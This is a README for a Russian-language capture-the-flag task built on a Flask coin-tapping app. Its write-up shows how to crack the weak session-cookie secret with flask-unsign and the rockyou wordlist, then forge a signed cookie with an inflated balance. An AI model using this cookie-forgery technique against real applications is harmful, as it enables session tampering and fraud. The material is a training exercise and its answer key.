# CoinFarmer

Время тапать кнопку! Получай коины и трать их на лучшие книги по изучению Python

## Описание задания
Приложение на Flask. На главной странице доступна кнопка для фарма коинов - при ее нажатии к балансу юзера прибавляется +1
Коины тратятся в магазине, нужно купить флаг за 99999999999999999999. Два варианта решения - либо кликать до пенсии, либо хакнуть приложение

## Deploy
При необходимости отредактируй флаг в /app/products.json (в объекте products[4], с id=5)

####  Далее нужно собрать образ
```
docker build -t coinfarmer .
```

#### Запуск контейнера
```
docker run -p 5000:5000 coinfarmer
```
## WriteUp

Данные о балансе хранятся в сессии пользователя. Чтобы это понять - надо декодировать и изучить сессионные Cookies, они будут содержать объект вида:
```
{'coins':0, 'products':[]}
```
Соответвенно при тапе значение меняется. Данное значение как раз проверяется при покупке товаров.

```
@app.route('/buy/<id>', methods=["GET"])
def buy(id):
.........    
    current_balance = session["coins"] 
    
    if current_balance < product["price"]:
        return render_template("no_money.html", product=product)
......
    session["coins"] = current_balance - product["price"]
    session["products"].append(product)
```

Уязвимость приложения заключается в слабом секрете, который используется для подписи Cookie. При наличии данного секрета можно подписывать самостоятельно Cookie с любыми изменениями. Для решения задачи можно использовать утилиту flask-unsign.
### Шаг 1
Установить модуль flask-unsign
```
pip3 install flask-unsign
```

Далее нужно сбрутить секрет для подписи
```
python3 -m flask_unsign --wordlist rockyou.txt --unsign --cookie "session-cooike-here" --no-literal-eval
```

### Шаг 2
Отредактировать cookie, подписать и применить ее в своем браузере
```
python3 -m flask_unsign --sign --cookie "{'coins':199999999999999999999}" --secret "flask_secret" --legacy
```

И купить флаг
